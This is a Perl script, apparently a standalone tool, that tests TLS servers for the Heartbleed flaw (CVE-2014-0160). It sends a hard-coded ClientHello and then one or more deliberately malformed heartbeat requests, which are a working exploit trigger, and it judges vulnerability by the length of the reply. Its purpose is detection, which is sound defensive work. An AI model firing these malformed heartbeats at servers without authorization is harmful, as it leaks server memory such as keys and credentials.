#!/usr/bin/perl
# Copyright: Steffen Ullrich 2014
# feel free to use, copy, modify without restrictions - NO WARRANTY

use strict;
use warnings;
use Getopt::Long qw(:config posix_default bundling);
use IO::Socket;

my $starttls = sub {1};
my $starttls_arg;
my $timeout = 5;
my $heartbeats = 1;
my %starttls = (
    'smtp' => \&smtp_starttls,
    'http' => \&http_connect,
    'imap' => \&imap_starttls,
    'pop'  => \&pop_stls,
);

sub usage {
    print STDERR "ERROR: @_\n" if @_;
    print STDERR <<USAGE;

Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)
Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
  --starttls proto[:arg] - start plain and upgrade to SSL with
			   starttls protocol (imap,smtp,http,pop)
  -T|--timeout T         - use timeout (default 5)
  -H|--heartbeats N      - number of heartbeats (default 1)
  -h|--help              - this screen

Examples:
  # check direct www, imaps .. server
  $0 www.google.com:443
  $0 www.google.com:https
  $0 mail.google.com:imaps

  # check webserver via proxy
  $0 --starttls http:www.google.com:443 proxy:8000

  # check imap server, start with plain and upgrade
  $0 --starttls imap imap.gmx.net:143

  # check pop server, start with plain and upgrade
  $0 --starttls pop pop.gmx.net:110

  # check smtp server, start with plain and upgrade
  $0 --starttls smtp smtp.gmail.com:587


USAGE
    exit(2);
}

GetOptions(
    'h|help' => sub { usage() },
    'T|timeout=i' => \$timeout,
    'H|heartbeats=i' => \$heartbeats,
    'starttls=s' => sub {
	(my $proto,$starttls_arg) = $_[1] =~m{^(\w+)(?::(.*))?$};
	usage("invalid starttls protocol $_[1]") if ! $proto
	    or not $starttls = $starttls{$proto};
    },
);

my $dst = shift(@ARGV) or usage("no destination given");
my $cl = IO::Socket::INET->new($dst) or die "failed to connect: $!";
$starttls->($cl);

# client hello with heartbeat extension
# taken from http://s3.jspenguin.org/ssltest.py
print $cl pack("H*",join('',qw(
		16 03 02 00  dc 01 00 00 d8 03 02 53
    43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
    00 0f 00 01 01
)));
while (1) {
    my ($type,$ver,@msg) = _readframe($cl) or die "no reply";
    last if $type == 22 and grep { $_->[0] == 0x0e } @msg; # server hello done
}
# heartbeat request with wrong size
# taken from http://s3.jspenguin.org/ssltest.py
for(1..$heartbeats) {
    warn "...send heartbeat#$_\n";
    print $cl pack("H*",join('',qw(18 03 02 00 03 01 40 00)));
}
if ( my ($type,$ver,$buf) = _readframe($cl)) {
    if ( $type == 21 ) {
	warn "received alert (probably not vulnerable)\n";
    } elsif ( $type != 24 ) {
	warn "unexpected reply type $type\n";
    } elsif ( length($buf)>3 ) {
	warn "BAD! got ".length($buf)." bytes back instead of 3 (vulnerable)\n";
    } else {
	warn "GOOD proper heartbeat reply (not vulnerable)\n";
    }
} else {
    warn "no reply - probably not vulnerable\n";
}

sub _readframe {
    my $cl = shift;
    my $len = 5;
    my $buf = '';
    vec( my $rin = '',fileno($cl),1 ) = 1;
    while ( length($buf)<$len ) {
	select( my $rout = $rin,undef,undef,$timeout ) or return;
	sysread($cl,$buf,$len-length($buf),length($buf)) or return;
	$len = unpack("x3n",$buf) + 5 if length($buf) == 5;
    }
    (my $type, my $ver,$buf) = unpack("Cnn/a*",$buf);
    my @msg;
    if ( $type == 22 ) {
	while ( length($buf)>=4 ) {
	    my ($ht,$len) = unpack("Ca3",substr($buf,0,4,''));
	    $len = unpack("N","\0$len");
	    push @msg,[ $ht,substr($buf,0,$len,'') ];
	    warn sprintf("...ssl received type=%d ver=0x%x ht=0x%x size=%d\n",
		$type,$ver,$ht,length($msg[-1][1]));
	}
    } else {
	@msg = $buf;
	warn sprintf("...ssl received type=%d ver=%x size=%d\n",
	    $type,$ver,length($buf));
    }

    return ($type,$ver,@msg);
}

sub smtp_starttls {
    my $cl = shift;
    <$cl>; # hello
    print $cl "EHLO foo\r\n";
    while (<$cl>) {
	last if m{^\d+\s};
    }
    print $cl "STARTTLS\r\n";
    my ($reply) = <$cl> =~m{^(\d+)};
    warn "...reply to starttls: $reply\n";
    return 1 if $reply =~m{^2};
    die "no starttls supported\n";
}

sub imap_starttls {
    my $cl = shift;
    <$cl>; # welcome
    print $cl "abc STARTTLS\r\n";
    while (<$cl>) {
	m{^abc (OK)?} or next;
	$1 or die "STARTTLS failed: $_";
	warn "...starttls: $_";
	return 1;
    }
}

sub pop_stls {
    my $cl = shift;
    <$cl>; # welcome
    print $cl "STLS\r\n";
    my $reply = <$cl>;
    die "STLS failed: $reply" if $reply !~m{^\+OK};
    warn "...stls $reply";
    return 1;
}

sub http_connect {
    my $cl = shift;
    $starttls_arg or die "no target host:port given";
    print $cl "CONNECT $starttls_arg HTTP/1.0\r\n\r\n";
    my $hdr = '';
    while (<$cl>) {
	$hdr .= $_;
	last if m{^\r?\n$};
    }
    $hdr =~m{^HTTP/1\.[01]\s+2\d\d} and return 1;
    die "CONNECT failed: $hdr\n";
}
